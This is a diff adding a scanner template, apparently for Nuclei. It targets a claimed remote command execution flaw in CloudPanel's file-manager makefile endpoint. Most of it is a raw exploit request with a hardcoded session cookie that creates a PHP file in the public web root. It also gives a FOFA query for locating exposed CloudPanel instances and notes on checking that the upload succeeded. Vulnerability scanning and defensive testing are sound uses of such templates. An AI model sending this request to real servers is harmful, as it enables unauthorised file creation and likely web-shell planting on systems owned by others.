@@ -1,0 +1,54 @@
+id: poc-ohmuyd6bp10g5oec
+info:
+  name: CloudPanel makefile接口存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ohmuyd6bp10g5oec'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ohmuyd6bp10g5oec
+    fofa: title=="CloudPanel | Log In"
+http:
+- raw:
+  - 'POST /file-manager/backend/makefile HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    id=/htdocs/app/files/public/&name=dudesite.php
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    dudesite.php
+
+
+    # 上传文件定位
+
+    /dudesite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
